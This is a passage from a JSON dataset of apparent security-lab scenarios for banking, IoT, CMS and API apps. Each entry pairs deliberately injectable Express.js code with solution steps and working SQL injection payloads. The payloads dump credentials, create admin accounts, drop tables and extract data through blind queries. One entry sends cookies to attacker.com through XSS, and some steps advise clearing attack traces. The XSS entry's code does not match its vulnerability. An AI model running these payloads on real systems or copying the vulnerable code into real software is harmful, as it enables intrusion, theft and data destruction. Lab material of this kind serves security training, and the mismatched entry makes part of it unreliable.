    "srcCode": "app.get('/convert', (req, res) => {\n  const { currency } = req.query;\n  db.query(`SELECT rate FROM exchange WHERE currency = '${currency}'`, (err, rate) => {\n    if (err) res.status(500).send('Error');\n    else res.send('Rate: ' + rate);\n  });\n});",
    "payloads": [
      "USD'; UPDATE exchange SET rate=1000 WHERE currency='USD'--",
      "BTC'; INSERT INTO logs (action) VALUES ('rate hijack')--"
    ]
  },
  {
    "Lab scenario": "Banking Reward API - UNION SQL Injection in Points Redeem System",
    "Lab Description": "The points redeem system accepts a 'voucher_id' input which is injectable via UNION statements. Exploiting this reveals customer reward balances and account mappings. To solve: dump reward history of top users.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Fuzz 'voucher_id' with UNION-based payloads via Burp.",
      "Match column count by trial and error.",
      "Dump reward history using crafted SELECT statements.",
      "Retrieve user mappings with UNION SELECT.",
      "Submit voucher code to simulate reward redemption."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/rewards/redeem', (req, res) => {\n  const { voucher_id } = req.query;\n  db.query(`SELECT * FROM rewards WHERE voucher = '${voucher_id}'`, (err, data) => {\n    if (err) res.status(500).send('Invalid');\n    else res.send('Success');\n  });\n});",
    "payloads": [
      "' UNION SELECT id, name, points FROM users --",
      "' UNION ALL SELECT null, 'admin', 99999 --"
    ]
  },
  {
    "Lab scenario": "Bank Internal File Access - SQL Injection via Filename Search",
    "Lab Description": "The file search system queries the 'documents' table based on unvalidated 'filename' input. SQL Injection allows attackers to extract file contents and system paths. To solve: retrieve internal configuration files via SQL payloads.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept search query to /file/search?filename=...",
      "Inject OR 1=1-- style payloads to list all filenames.",
      "Use UNION SELECT to read sensitive config entries.",
      "Dump contents of internal logs or env vars.",
      "Export results to exfiltrate server-side file data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/file/search', (req, res) => {\n  const { filename } = req.query;\n  db.query(`SELECT * FROM documents WHERE filename LIKE '%${filename}%'`, (err, rows) => {\n    if (err) res.status(500).send('Error');\n    else res.json(rows);\n  });\n});",
    "payloads": [
      "%' OR 1=1 --",
      "%' UNION SELECT null, LOAD_FILE('/etc/passwd') --"
    ]
  },
  {
    "Lab scenario": "Banking Email Export Tool - Boolean SQL Injection in Filter Expression",
    "Lab Description": "Email export filters use an injectable expression that gets appended to a WHERE clause. Attackers can use Boolean logic to infer email content and attachments. To solve: extract sensitive PDF reports by exploiting Boolean logic.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept export request and locate 'filter' parameter.",
      "Use AND 1=1/AND 1=2 payloads to determine logic handling.",
      "Craft Boolean expressions to reveal email content.",
      "Use substr + ascii to extract subject line char-by-char.",
      "Compile leaked email list and decode attachments."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/export-emails', (req, res) => {\n  const { filter } = req.query;\n  db.query(`SELECT * FROM emails WHERE ${filter}`, (err, emails) => {\n    if (err) res.status(500).send('Export failed');\n    else res.json(emails);\n  });\n});",
    "payloads": [
      "1=1 --",
      "1=0 OR ascii(substr(subject,1,1))=65 --"
    ]
  },
  {
    "Lab scenario": "Banking portal stacked SQL injection in search query logging",
    "Lab Description": "The backend logs every user search to a database without sanitizing input. The application fails to restrict multiple SQL statements in one request, allowing attackers to perform stacked queries. To solve: Inject a payload that adds a new admin user to the database via stacked query execution.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept search request using Burp Suite",
      "Send payload with a semicolon to test stacked query support",
      "Craft injection to insert an admin user: '; INSERT INTO users (username, password, role) VALUES ('hacker', 'pass123', 'admin'); --",
      "Observe server behavior or error logs confirming injection success",
      "Login with the new admin credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const term = req.query.q;\n  const logQuery = `INSERT INTO search_logs (term) VALUES ('${term}')`;\n  db.query(logQuery, (err) => {\n    if (err) console.log('DB Error:', err);\n    res.send('Search term logged.');\n  });\n});",
    "payloads": [
      "'; INSERT INTO users (username, password, role) VALUES ('admin2','admin123','admin'); --",
      "'; DROP TABLE transactions; --",
      "'; UPDATE accounts SET balance=100000 WHERE user='attacker'; --"
    ]
  },
  {
    "Lab scenario": "API gateway Boolean-based SQL injection in filter parameter",
    "Lab Description": "An API accepts filter parameters for sorting transaction data. The SQL query does not properly escape the 'filter' parameter, enabling Boolean-based SQL injection. To solve: Extract the database version using a true/false inference technique.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a GET request with different 'filter' values",
      "Test payload: ' OR 1=1 -- to confirm vulnerability",
      "Use time delay logic like ' OR 1=1 AND SLEEP(5) -- to infer",
      "Craft a binary search loop using sqlmap with --technique=B",
      "Extract version string from system tables"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/api/transactions', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT * FROM transactions WHERE status='${filter}'`;\n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    else res.json(results);\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' AND SUBSTRING(@@version,1,1)='5' --",
      "' AND ASCII(SUBSTRING((SELECT version()),1,1))=52 --"
    ]
  },
  {
    "Lab scenario": "IoT dashboard UNION SQL injection in device filter",
    "Lab Description": "The IoT dashboard uses a vulnerable SQL statement to filter devices based on type. The 'deviceType' parameter is not sanitized, allowing attackers to inject a UNION query. To solve: Leak admin credentials from the 'users' table via UNION-based injection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to spider device filter endpoints",
      "Identify vulnerable parameter with UNION ... NULL test",
      "Determine number of columns using ORDER BY and UNION NULL technique",
      "Craft UNION SELECT payload to retrieve username and password",
      "Capture credentials from server response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/devices', (req, res) => {\n  const type = req.query.deviceType;\n  const query = `SELECT id, name FROM devices WHERE type='${type}'`;\n  db.query(query, (err, results) => {\n    if (err) console.log(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "' UNION SELECT username, password FROM users --",
      "' UNION SELECT null, version() --",
      "' UNION SELECT 1, group_concat(email) FROM users --"
    ]
  },
  {
    "Lab scenario": "CMS comment section out-of-band SQL injection in author metadata",
    "Lab Description": "The CMS stores commenter metadata and inserts the author value into the database without escaping. The backend firewall suppresses error messages, making exploitation detectable only via out-of-band channels. To solve: Trigger an OOB DNS request via injected SQL.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit comment with controlled 'author' field using Burp Suite",
      "Inject payload using MSSQL's xp_dirtree or MySQL's LOAD_FILE",
      "Monitor Burp Collaborator or DNS logs for exfiltrated subdomain",
      "Confirm server made DNS/HTTP request to external domain",
      "Use injection to extract more data or confirm DB backend"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/comment', (req, res) => {\n  const { comment, author } = req.body;\n  const insert = `INSERT INTO comments (text, author) VALUES ('${comment}', '${author}')`;\n  db.query(insert, (err) => {\n    if (err) console.error('Insert failed:', err);\n    res.send('Comment submitted');\n  });\n});",
    "payloads": [
      "'; exec master..xp_dirtree '//attacker.collab.com/test' --",
      "'; SELECT LOAD_FILE('\\\\attacker.com\\test') --",
      "'; SELECT pg_read_file('/etc/passwd') --"
    ]
  },
  {
    "Lab scenario": "Banking portal SQL injection in account filtering with GROUP BY",
    "Lab Description": "The backend forms a SQL query grouping accounts by status. It allows raw injection into the GROUP BY clause via user-supplied filters. To solve: Exploit the GROUP BY to inject HAVING clauses and trigger data leakage.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to analyze GET /accounts?groupBy=status",
      "Inject HAVING 1=1 -- to observe impact",
      "Craft payloads using GROUP BY ... HAVING to filter conditional rows",
      "Use UNION or SELECT inside HAVING to leak data",
      "Confirm sensitive fields in response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/accounts', (req, res) => {\n  const group = req.query.groupBy;\n  const query = `SELECT COUNT(*), ${group} FROM accounts GROUP BY ${group}`;\n  db.query(query, (err, rows) => {\n    if (err) res.status(500).send('Error');\n    else res.json(rows);\n  });\n});",
    "payloads": [
      "status HAVING 1=1 --",
      "status HAVING (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a' --",
      "status HAVING LENGTH((SELECT password FROM users LIMIT 1))>5 --"
    ]
  },
  {
    "Lab scenario": "Banking API SQL injection in nested JSON field",
    "Lab Description": "The API processes nested JSON payloads and uses the 'account.id' field in a query without sanitization. This allows injection inside JSON bodies. To solve: Inject a payload to retrieve internal configuration data using a UNION SELECT.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Craft JSON body and intercept with Burp Suite",
      "Inject SQL into account.id: \"' UNION SELECT config_value, NULL FROM settings --\"",
      "Use Postman to send requests and analyze API response",
      "Check returned values for leakage from 'settings' table",
      "Confirm internal keys or configurations were exposed"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/transfer', (req, res) => {\n  const id = req.body.account.id;\n  const q = `SELECT balance FROM accounts WHERE id='${id}'`;\n  db.query(q, (err, result) => {\n    if (err) res.status(500).send('Error');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT config_value, NULL FROM settings --",
      "' OR 1=1 --",
      "' AND SLEEP(5) --"
    ]
  },
  {
    "Lab scenario": "CMS SQL injection in ORDER BY parameter on blog list",
    "Lab Description": "The blog list uses dynamic ORDER BY values from user input. There is no input whitelist or escaping, allowing injection into the SQL ORDER BY clause. To solve: Leak usernames using error-based payloads via ordering expressions.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Access /blogs?sortBy=date via browser",
      "Test payload: sortBy=1;SELECT version() --",
      "Inject ORDER BY CASE statements to cause errors or leak data",
      "Observe error leakage in verbose logging",
      "Confirm exposed usernames or version"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/blogs', (req, res) => {\n  const sort = req.query.sortBy;\n  const query = `SELECT * FROM blogs ORDER BY ${sort}`;\n  db.query(query, (err, rows) => {\n    if (err) res.status(500).send(err.message);\n    else res.json(rows);\n  });\n});",
    "payloads": [
      "title;SELECT version() --",
      "CASE WHEN (1=1) THEN title ELSE date END",
      "1;SELECT username FROM users LIMIT 1 --"
    ]
  },
  {
    "Lab scenario": "IoT dashboard time-based SQL injection in settings update",
    "Lab Description": "The dashboard stores device settings submitted via a POST form. The device ID is vulnerable to SQL injection with no error output. To solve: Use time-based payloads to extract the first character of the admin's password.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send POST with device ID field using OWASP ZAP",
      "Inject time-based payload: ' OR IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) --",
      "Observe response time to infer correct character",
      "Automate binary search with sqlmap and --technique=T",
      "Extract full password"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/device/settings', (req, res) => {\n  const id = req.body.deviceId;\n  const update = `UPDATE devices SET mode='auto' WHERE id='${id}'`;\n  db.query(update, (err) => {\n    if (err) console.error(err);\n    res.send('Updated');\n  });\n});",
    "payloads": [
      "' OR IF(SUBSTRING((SELECT password FROM users WHERE role='admin'),1,1)='a', SLEEP(5), 0) --",
      "' AND SLEEP(3) --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking portal UNION SQL injection in account balance query",
    "Lab Description": "The banking portal allows users to view their balance by submitting an account number via URL parameters. However, the account number input is directly inserted into an SQL query without proper sanitization, enabling a UNION-based SQL injection attack. To solve: Use UNION to retrieve additional data from the users table and exploit this vulnerability to extract usernames and email addresses.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept request with Burp Suite and observe the account parameter",
      "Test for UNION support by injecting ' UNION SELECT NULL --'",
      "Craft a UNION-based injection to retrieve usernames and emails from the 'users' table",
      "Use sqlmap to automate the extraction of sensitive data",
      "Verify the data by logging in with extracted credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/account', (req, res) => {\n  const account = req.query.account;\n  const query = `SELECT balance FROM accounts WHERE account_number = '${account}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' UNION SELECT username, email FROM users --",
      "' UNION SELECT NULL, version() --",
      "' UNION SELECT 1, group_concat(username) FROM users --"
    ]
  },
  {
    "Lab scenario": "CMS POST-based SQL injection in user registration form",
    "Lab Description": "A Content Management System (CMS) registration form allows users to create accounts by submitting their details. The backend SQL query used to insert these details does not sanitize input, allowing SQL injection attacks through form fields. To solve: Inject malicious SQL to create a new admin user in the system\u00e2\u20ac\u2122s database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Monitor form submission using Burp Suite",
      "Test for injection by submitting a payload in the 'username' field",
      "Craft an SQL payload to insert a new admin account: ' OR 1=1; INSERT INTO users (username, password, role) VALUES ('attacker', 'password', 'admin'); --'",
      "Use sqlmap to automate the attack and verify user creation",
      "Log in with the newly created admin credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/register', (req, res) => {\n  const { username, password } = req.body;\n  const query = `INSERT INTO users (username, password) VALUES ('${username}', '${password}')`; \n  db.query(query, (err) => {\n    if (err) res.status(500).send('Error');\n    res.send('User created');\n  });\n});",
    "payloads": [
      "' OR 1=1; INSERT INTO users (username, password, role) VALUES ('attacker', 'password', 'admin'); --",
      "'; DROP TABLE users; --",
      "'; UPDATE users SET role='admin' WHERE username='attacker'; --"
    ]
  },
  {
    "Lab scenario": "IoT device dashboard Blind SQL injection in device ID input",
    "Lab Description": "The IoT device dashboard accepts a device ID in the URL to fetch device status. The input is not sanitized, leading to a blind SQL injection vulnerability. To solve: Use boolean-based blind SQL injection to infer device status or other sensitive information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept and analyze the device ID parameter with Burp Suite",
      "Test the parameter for blind injection by injecting ' OR 1=1 -- and checking for server response changes",
      "Craft a boolean-based payload to infer the existence of a specific device or admin",
      "Automate the exploitation using sqlmap with --technique=B",
      "Verify the status or device details from the response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device/status', (req, res) => {\n  const id = req.query.deviceId;\n  const query = `SELECT status FROM devices WHERE device_id = '${id}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' AND (SELECT COUNT(*) FROM devices) > 0 --",
      "' AND (SELECT SUBSTRING(status, 1, 1) FROM devices WHERE device_id = 1) = 'a' --"
    ]
  },
  {
    "Lab scenario": "API gateway SQL injection in POST parameter (nested JSON)",
    "Lab Description": "The API accepts a nested JSON payload to update device configurations. The 'deviceId' in the JSON is vulnerable to SQL injection. To solve: Craft a nested SQL injection payload to retrieve data from other tables in the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send a POST request using Postman with a nested JSON body containing the 'deviceId' field",
      "Inject SQL code into the 'deviceId' field: ' OR 1=1 --",
      "Use Burp Suite to analyze server responses and determine the number of columns",
      "Automate SQL query extraction with sqlmap and --technique=U for UNION queries",
      "Extract sensitive data like admin credentials or configuration details"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/device/update', (req, res) => {\n  const deviceId = req.body.device.id;\n  const query = `UPDATE devices SET status='active' WHERE device_id='${deviceId}'`; \n  db.query(query, (err) => {\n    if (err) res.status(500).send('Error');\n    res.send('Updated');\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "'; UNION SELECT null, version() --",
      "' UNION SELECT username, password FROM users --"
    ]
  },
  {
    "Lab scenario": "CMS user profile SQL injection in username parameter",
    "Lab Description": "A CMS allows users to update their profiles. The 'username' field in the form is vulnerable to SQL injection, leading to potential data leakage. To solve: Inject SQL to retrieve other users\u00e2\u20ac\u2122 usernames and email addresses from the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to capture the user profile update request",
      "Inject SQL payload into the username field to test for injection: ' OR 1=1 --",
      "Use UNION SELECT to retrieve other users' data from the 'users' table",
      "Automate with sqlmap to extract usernames and emails",
      "Verify by updating profile with new malicious data"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/profile/update', (req, res) => {\n  const { username, email } = req.body;\n  const query = `UPDATE users SET email='${email}' WHERE username='${username}'`; \n  db.query(query, (err) => {\n    if (err) res.status(500).send('Error');\n    res.send('Profile updated');\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT username, email FROM users --",
      "'; SELECT password FROM users WHERE username='admin' --"
    ]
  },
  {
    "Lab scenario": "API gateway SQL injection in query parameter (username)",
    "Lab Description": "The API gateway accepts a query parameter for user authentication based on the username. This parameter is not sanitized properly, leading to a SQL injection vulnerability. To solve: Use a UNION-based SQL injection to extract data from the users table and retrieve the admin credentials.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a request with the username query parameter",
      "Test for injection by adding ' UNION SELECT NULL, username, password FROM users --'",
      "Use sqlmap to automate the UNION injection and retrieve admin credentials",
      "Verify the extracted credentials by using them to log into the application",
      "Cleanup: Remove session data and obfuscate the attack trace"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/api/authenticate', (req, res) => {\n  const username = req.query.username;\n  const query = `SELECT id, password FROM users WHERE username = '${username}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL, username, password FROM users --",
      "' UNION SELECT 1, version() --",
      "'; DROP TABLE users --"
    ]
  },
  {
    "Lab scenario": "IoT dashboard Time-based Blind SQL injection in device name",
    "Lab Description": "The IoT dashboard allows querying of device names through a vulnerable search API. The input is not sanitized, allowing for time-based blind SQL injection. To solve: Use time-based SQL injection to infer device information from the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture the request using Burp Suite and locate the device name parameter",
      "Inject a payload like ' OR IF(1=1, SLEEP(5), 0) -- to test for time-based response",
      "Craft time-based payloads to infer the existence of devices or usernames",
      "Use sqlmap with --technique=T for time-based exploitation",
      "Verify device information by analyzing the delay in responses"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device/search', (req, res) => {\n  const deviceName = req.query.name;\n  const query = `SELECT name FROM devices WHERE name = '${deviceName}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' OR IF(1=1, SLEEP(5), 0) --",
      "' OR IF(1=2, SLEEP(5), 0) --",
      "' AND SLEEP(5) --"
    ]
  },
  {
    "Lab scenario": "Banking portal ORDER BY SQL injection in transaction history",
    "Lab Description": "The banking portal allows users to view transaction histories through the 'order by' query parameter. However, the query does not sanitize the input, allowing an attacker to manipulate the query and gain unauthorized access to sensitive data. To solve: Use an ORDER BY-based SQL injection to enumerate columns and extract data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the request using Burp Suite and observe the 'order by' parameter",
      "Inject ' ORDER BY 1--' to test for error-based feedback",
      "Enumerate the column numbers by incrementing the 'order by' value until the application crashes",
      "Craft a UNION-based payload to extract transaction history and account details",
      "Use sqlmap to automate the enumeration process and retrieve sensitive data"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/account/transactions', (req, res) => {\n  const order = req.query.orderBy;\n  const query = `SELECT id, date, amount FROM transactions ORDER BY ${order}`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' ORDER BY 1 --",
      "' ORDER BY 2 --",
      "' UNION SELECT username, password FROM users --"
    ]
  },
  {
    "Lab scenario": "CMS product filter SQL injection in product ID",
    "Lab Description": "The CMS allows users to filter products by ID, but the input is not sanitized. This creates an opportunity for SQL injection. To solve: Inject SQL payloads into the product ID filter to enumerate other products and extract their details.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept the request with Burp Suite and identify the product ID parameter",
      "Test for SQL injection by injecting ' OR 1=1 --",
      "Use UNION SELECT to retrieve product information from the 'products' table",
      "Use sqlmap to automate the attack and confirm the data extraction",
      "Verify the product data by analyzing the server response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/products', (req, res) => {\n  const productId = req.query.productId;\n  const query = `SELECT id, name, price FROM products WHERE id = '${productId}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT id, name, price FROM products --",
      "'; SELECT password FROM users WHERE username='admin' --"
    ]
  },
  {
    "Lab scenario": "IoT device control SQL injection in device control endpoint",
    "Lab Description": "The IoT device control endpoint accepts device ID input via query parameters, which is directly inserted into an SQL query without sanitization. To solve: Exploit this vulnerability using a UNION SQL injection to access sensitive data, such as device configuration and user information.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the request using Burp Suite and observe the device ID parameter",
      "Inject ' UNION SELECT NULL, device_id, device_status FROM devices --' to test the SQL injection",
      "Enumerate columns and gather sensitive device information",
      "Use sqlmap to automate the exploitation and retrieve admin-level device data",
      "Use the extracted data to modify device configurations"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device/control', (req, res) => {\n  const deviceId = req.query.deviceId;\n  const query = `SELECT id, status FROM devices WHERE id = '${deviceId}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL, device_id, device_status FROM devices --",
      "'; UNION SELECT username, password FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "API gateway SQL injection in user search API",
    "Lab Description": "The API gateway allows admins to search for users by their username. The 'username' field is vulnerable to SQL injection, which can be exploited to extract data. To solve: Use a UNION-based SQL injection to retrieve sensitive user data from the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a search request with a crafted 'username' parameter",
      "Test the injection using ' UNION SELECT username, email FROM users --'",
      "Use sqlmap to automate the UNION attack and extract usernames and emails",
      "Verify the extraction by analyzing the returned user data",
      "Obfuscate the attack and clear traces"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/api/search', (req, res) => {\n  const username = req.query.username;\n  const query = `SELECT id, email FROM users WHERE username = '${username}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' UNION SELECT username, email FROM users --",
      "'; SELECT password FROM users WHERE username='admin' --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking portal HAVING SQL injection in transaction query",
    "Lab Description": "The banking portal uses a HAVING clause to filter transactions by status. The application does not sanitize input, allowing an attacker to inject malicious SQL. To solve: Use a HAVING clause-based SQL injection to enumerate columns and extract sensitive transaction data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the request using Burp Suite and examine the 'status' parameter",
      "Test for HAVING clause injection using ' HAVING 1=1 --'",
      "Enumerate columns with ' HAVING 1=2 --' and adjust until the correct number of columns is found",
      "Craft a UNION-based SQL payload to extract transaction data",
      "Automate extraction with sqlmap and verify the returned results"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transactions', (req, res) => {\n  const status = req.query.status;\n  const query = `SELECT id, amount FROM transactions HAVING status = '${status}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' HAVING 1=1 --",
      "' HAVING 1=2 --",
      "' UNION SELECT username, password FROM users --"
    ]
  },
  {
    "Lab scenario": "CMS file upload SQL injection in file name parameter",
    "Lab Description": "The CMS allows users to upload profile images, but it is vulnerable to SQL injection in the 'fileName' parameter. An attacker can inject SQL into the file name, which is used in a database query. To solve: Exploit the SQL injection vulnerability to extract user data by manipulating the file name parameter.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the file upload request using Burp Suite",
      "Inject a SQL payload into the 'fileName' parameter: ' OR 1=1 --",
      "Use UNION SELECT to retrieve user data from the 'users' table",
      "Automate the attack using sqlmap to extract information",
      "Verify the extracted data by analyzing the server response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/upload', (req, res) => {\n  const fileName = req.body.fileName;\n  const query = `INSERT INTO uploads (file_name) VALUES ('${fileName}')`; \n  db.query(query, (err) => {\n    if (err) res.status(500).send('Error');\n    res.send('File uploaded');\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT username, password FROM users --",
      "'; SELECT id FROM users WHERE username='admin' --"
    ]
  },
  {
    "Lab scenario": "Banking portal XSS stored in transaction search",
    "Lab Description": "The banking portal's transaction search page is vulnerable to stored XSS. An attacker can inject malicious JavaScript into the search query, which will be stored and executed in the response. To solve: Exploit the XSS vulnerability to steal session tokens.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the request using Burp Suite and modify the transaction search input with a malicious script",
      "Inject a script: <script>document.location='http://attacker.com?cookie=' + document.cookie;</script>",
      "Submit the search request and observe the execution of the script when viewing the transaction results",
      "Verify the stolen session token by checking the attacker\u00e2\u20ac\u2122s server logs",
      "Obfuscate the payload to avoid detection by web application firewalls"
    ],
    "Vulnerability name": "XSS",
    "srcCode": "app.get('/search/transactions', (req, res) => {\n  const searchQuery = req.query.query;\n  const query = `SELECT * FROM transactions WHERE description LIKE '%${searchQuery}%'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.send(results);\n  });\n});",
    "payloads": [
      "<script>document.location='http://attacker.com?cookie=' + document.cookie;</script>",
      "<img src='x' onerror='alert(document.cookie)'>",
      "<svg onload='alert(document.cookie)'></svg>"
    ]
  },
  {
    "Lab scenario": "IoT dashboard UNION-based SQL injection in device control",
    "Lab Description": "The IoT dashboard allows device control based on the device ID, but it is vulnerable to SQL injection in the device ID parameter. To solve: Use a UNION-based SQL injection to extract sensitive user information from the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request with the device ID parameter",
      "Test for SQL injection by injecting ' UNION SELECT NULL, username, email FROM users --'",
      "Enumerate additional columns using the UNION-based attack",
      "Extract sensitive user information such as usernames and emails",
      "Obfuscate the attack and use the extracted data for post-exploitation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device/control', (req, res) => {\n  const deviceId = req.query.deviceId;\n  const query = `SELECT id, status FROM devices WHERE id = '${deviceId}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL, username, email FROM users --",
      "' UNION SELECT username, password FROM users --",
      "'; SELECT id FROM users WHERE username='admin' --"
    ]
  },
  {
    "Lab scenario": "Banking portal Boolean-based Blind SQL injection in account balance query",
    "Lab Description": "The banking portal allows querying of account balances, but it is vulnerable to Boolean-based blind SQL injection. To solve: Use Boolean-based blind SQL injection to infer account balance information by testing for true/false conditions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the balance query request and modify the account ID parameter",
      "Inject a payload like ' OR 1=1 --' to test for true conditions and ' OR 1=2 --' for false conditions",
      "Use the blind SQL injection technique to extract account balance information by incrementing character positions and testing for correct results",
      "Verify the balance data by analyzing server responses and using sqlmap to automate extraction",
      "Obfuscate the attack and remove any traces of the injection"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/account/balance', (req, res) => {\n  const accountId = req.query.accountId;\n  const query = `SELECT balance FROM accounts WHERE account_id = '${accountId}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' OR 1=2 --",
      "' AND 1=1 --"
    ]
  },
  {
    "Lab scenario": "CMS search SQL injection in title parameter",
    "Lab Description": "The CMS search functionality is vulnerable to SQL injection in the title query parameter. This allows an attacker to inject SQL queries into the search functionality. To solve: Use a UNION-based SQL injection to enumerate columns and extract sensitive information.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to intercept the search query request and test for SQL injection",
      "Inject the payload ' UNION SELECT NULL, title, content FROM articles --'",
      "Enumerate columns by adjusting the UNION SELECT payload",
      "Extract article titles and contents from the 'articles' table",
      "Verify the attack by analyzing the returned article data"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const title = req.query.title;\n  const query = `SELECT title, content FROM articles WHERE title LIKE '%${title}%'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL, title, content FROM articles --",
      "' UNION SELECT username, password FROM users --",
      "'; SELECT id FROM users WHERE username='admin' --"
    ]
  },
  {
    "Lab scenario": "IoT dashboard Time-based Blind SQL injection in sensor data query",
    "Lab Description": "The IoT dashboard is vulnerable to time-based blind SQL injection in the sensor data query, allowing an attacker to infer sensor data from the database by observing time delays. To solve: Use time-based blind SQL injection to retrieve sensitive data by introducing delays.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture the request with Burp Suite and identify the sensor ID parameter",
      "Test for time-based SQL injection with payloads like ' OR IF(1=1, SLEEP(5), 0) --'",
      "Infer the data from sensor records by adjusting the time delay in the response",
      "Use sqlmap with --technique=T for time-based exploitation",
      "Verify the results by measuring the delay in response times"
    ],
    "Vulnerability name": "SQL injection",
